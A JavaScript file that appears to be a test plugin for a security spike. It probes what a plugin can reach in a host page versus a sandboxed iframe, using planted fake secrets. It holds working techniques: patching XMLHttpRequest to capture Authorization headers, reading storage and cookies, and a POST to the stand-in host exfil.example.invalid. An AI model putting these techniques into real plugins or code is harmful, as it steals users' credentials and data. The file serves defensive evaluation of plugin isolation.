// @ts-check
/**
 * The sample plugin of the decision 5 spike: a custom element that tries to reach what a plugin
 * might want, and reports what it reached.
 *
 * **Every value it can find is a fake the spike's host page planted**, each starting `FAKE-`. It
 * sends nothing anywhere except to the demo server's own `/api/whoami`, and to
 * `exfil.example.invalid`, a name that by definition never resolves, to show whether the page's
 * Content-Security-Policy refuses the request first.
 *
 * It is one file with no imports on purpose: the `integrity` a host checks covers this file and
 * nothing it would import.
 *
 * It runs in two places in the demo: in the host's page, as a run-time plugin would, and inside a
 * sandboxed iframe, the isolation option. The same bytes give different answers, which is the
 * point.
 */

/** Authorization header values seen in flight, through the patch below. @type {string[]} */
const capturedAuthorization = [];

// A plugin evaluated in the host's realm shares the host's built-ins. Patching one is all it takes
// to see every header the host sets in JavaScript, whatever the host keeps in storage.
const nativeSetRequestHeader = XMLHttpRequest.prototype.setRequestHeader;
/**
 * @this {XMLHttpRequest}
 * @param {string} name
 * @param {string} value
 */
XMLHttpRequest.prototype.setRequestHeader = function setRequestHeader(name, value) {
  if (String(name).toLowerCase() === 'authorization') capturedAuthorization.push(String(value));
  return nativeSetRequestHeader.call(this, name, value);
};

const framed = window.parent !== window;
const where = framed ? 'the sandboxed frame' : "the host's page";

/**
 * @typedef {{ probe: string, reached: boolean | null, detail: string }} ProbeResult
 */

/** CSP violations seen since the plugin loaded, by directive. @type {string[]} */
const violations = [];
document.addEventListener('securitypolicyviolation', (event) => {
  violations.push(`${event.effectiveDirective} refused ${event.blockedURI || 'inline'}`);
});

/**
 * @param {number} ms
 * @returns {Promise<void>}
 */
const pause = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

/**
 * @param {unknown} error
 * @returns {string}
 */
const explain = (error) =>
  error instanceof Error ? `${error.name}: ${error.message}` : String(error);

/**
 * Each probe answers `reached: true` when it got what it tried for, `false` when something
 * stopped it, and `null` when it deliberately did not try.
 *
 * @type {ReadonlyArray<[string, () => Promise<{ reached: boolean | null, detail: string }>]>}
 */
const PROBES = [
  [
    'host-dom',
    async () => {
      const local = document.getElementById('host-secret')?.textContent;
      if (local) return { reached: true, detail: `read the host's element: "${local}"` };
      // Not in this document: try the parent's.
      const parent = window.parent.document.getElementById('host-secret')?.textContent;
      return parent
        ? { reached: true, detail: `read the parent page's element: "${parent}"` }
        : { reached: false, detail: 'no host element reachable' };
    },
  ],
  [
    'session-storage',
    async () => {
      const value = sessionStorage.getItem('spike_session');
      return value
        ? { reached: true, detail: `read the stored session: "${value}"` }
        : { reached: false, detail: 'nothing stored under spike_session in this origin' };
    },
  ],
  [
    'local-storage',
    async () => {
      const value = localStorage.getItem('spike_local');
      return value
        ? { reached: true, detail: `read localStorage: "${value}"` }
        : { reached: false, detail: 'nothing stored under spike_local in this origin' };
    },
  ],
  [
    'readable-cookie',
    async () => {
      // Only the planted cookie is reported: a developer's browser may hold others for 127.0.0.1.
      const planted = document.cookie
        .split(/;\s*/)
        .find((cookie) => cookie.startsWith('spike_readable='));
      return planted
        ? { reached: true, detail: `read the planted cookie from document.cookie: "${planted}"` }
        : { reached: false, detail: 'no readable cookie in this document' };
    },
  ],
  [
    'httponly-cookie',
    async () => {
      const cookies = document.cookie;
      return cookies.includes('spike_httponly=')
        ? { reached: true, detail: 'read the HttpOnly cookie' }
        : { reached: false, detail: 'HttpOnly cookies are not in document.cookie' };
    },
  ],
  [
    'host-client',
    async () => {
      /** @type {{ spikeHost?: { nuxeoClient?: { whoAmI(): Promise<unknown> } } }} */
      const scope = /** @type {never} */ (window);
      const client = scope.spikeHost?.nuxeoClient;
      if (!client) return { reached: false, detail: 'no host client on this window' };
      const answer = await client.whoAmI();
      return { reached: true, detail: `called the host's client: ${JSON.stringify(answer)}` };
    },
  ],
  [
    'ambient-session',
    async () => {
      // No credential in hand: the browser attaches the session cookie by itself, if it will.
      const response = await fetch('/api/whoami?caller=plugin', { credentials: 'include' });
      const answer = await response.json();
      return answer.cookie
        ? {
            reached: true,
            detail:
              'a request from the plugin carried the HttpOnly session cookie: it acts as the user without reading it',
          }
        : { reached: false, detail: 'the request arrived without the session cookie' };
    },
  ],
  [
    'in-flight-authorization',
    async () => {
      // The host makes a request of its own just after the plugin connects; wait for it.
      for (let waited = 0; waited < 1500 && capturedAuthorization.length === 0; waited += 100) {
        await pause(100);
      }
      return capturedAuthorization.length > 0
        ? {
            reached: true,
            detail: `captured the host's own Authorization header in flight: "${capturedAuthorization[0]}"`,
          }
        : { reached: false, detail: "saw no Authorization header set in this realm's XHR" };
    },
  ],
  [
    'cross-origin-fetch',
    async () => {
      const before = violations.length;
      try {
        await fetch('https://exfil.example.invalid/collect', {
          method: 'POST',
          mode: 'no-cors',
          body: 'FAKE-exfiltration-attempt',
        });
        return { reached: true, detail: 'the request left the page' };
      } catch (error) {
        await pause(50);
        const csp = violations.slice(before).find((v) => v.startsWith('connect-src'));
        return {
          reached: false,
          detail: csp ? `refused by CSP: ${csp}` : `failed without a CSP report: ${explain(error)}`,
        };
      }
    },
  ],
  [
    'inline-script',
    async () => {
      /** @type {{ __spikeInlineRan?: boolean }} */
      const scope = /** @type {never} */ (window);
      const script = document.createElement('script');
      script.textContent = 'window.__spikeInlineRan = true;';
      document.head.append(script);
      await pause(50);
      return scope.__spikeInlineRan
        ? { reached: true, detail: 'an inline script ran' }
        : { reached: false, detail: 'the inline script did not run (CSP script-src)' };
    },
  ],
  [
    'string-to-code',
    async () => {
      const value = new Function('return 41 + 1')();
      return { reached: value === 42, detail: 'compiled a string to code' };
    },
  ],
  [
    'redefine-host-element',
    async () => {
      customElements.define('spike-host-widget', class extends HTMLElement {});
      return {
        reached: true,
        detail: `defined <spike-host-widget> in ${where}'s registry, before anyone else did`,
      };
    },
  ],
  [
    'undeclared-element',
    async () => {
      customElements.define('spike-undeclared-element', class extends HTMLElement {});
      return {
        reached: true,
        detail: `defined an element its manifest never declared, in ${where}'s registry`,
      };
    },
  ],
  [
    'patch-global-fetch',
    async () => {
      const original = window.fetch;
      window.fetch = (...args) => original(...args);
      const patched = window.fetch !== original;
      window.fetch = original;
      return {
        reached: patched,
        detail: `replaced window.fetch in ${where}, then put it back`,
      };
    },
  ],
  [
    'top-navigation',
    async () => ({
      reached: null,
      detail:
        'CSP has no directive that stops a script navigating its own page away; only a sandbox ' +
        'without allow-top-navigation does. Not attempted, so the demo page stays put',
    }),
  ],
];

/**
 * @returns {Promise<ProbeResult[]>}
 */
async function probeAll() {
  /** @type {ProbeResult[]} */
  const results = [];
  for (const [probe, run] of PROBES) {
    try {
      const { reached, detail } = await run();
      results.push({ probe, reached, detail });
    } catch (error) {
      results.push({ probe, reached: false, detail: explain(error) });
    }
  }
  return results;
}

class SpikeSamplePlugin extends HTMLElement {
  /** @type {ProbeResult[] | null} */
  report = null;

  connectedCallback() {
    if (this.shadowRoot) return;
    const root = this.attachShadow({ mode: 'open' });
    const heading = document.createElement('p');
    heading.textContent = `Sample plugin, running in ${where}: probing…`;
    root.append(heading);
    void probeAll().then((results) => {
      this.report = results;
      heading.textContent = `Sample plugin, running in ${where}: ${results.filter((r) => r.reached).length} of ${results.length} probes reached what they tried for.`;
      const list = document.createElement('ul');
      for (const result of results) {
        const item = document.createElement('li');
        const verdict =
          result.reached === null ? 'not tried' : result.reached ? 'REACHED' : 'stopped';
        item.textContent = `${result.probe}: ${verdict}. ${result.detail}`;
        list.append(item);
      }
      root.append(list);
      this.dispatchEvent(
        new CustomEvent('spike-plugin-report', { detail: results, bubbles: true }),
      );
      if (framed) {
        // The host put its own origin in the frame's address; answer only that origin.
        const target = new URLSearchParams(location.hash.slice(1)).get('parent') ?? '';
        if (/^https?:\/\/[^/]+$/.test(target)) {
          window.parent.postMessage({ type: 'spike-plugin-report', results }, target);
        }
      }
    });
  }
}

customElements.define('spike-sample-plugin', SpikeSamplePlugin);

// A module, so nothing above lands on the page's global scope by name.
export {};
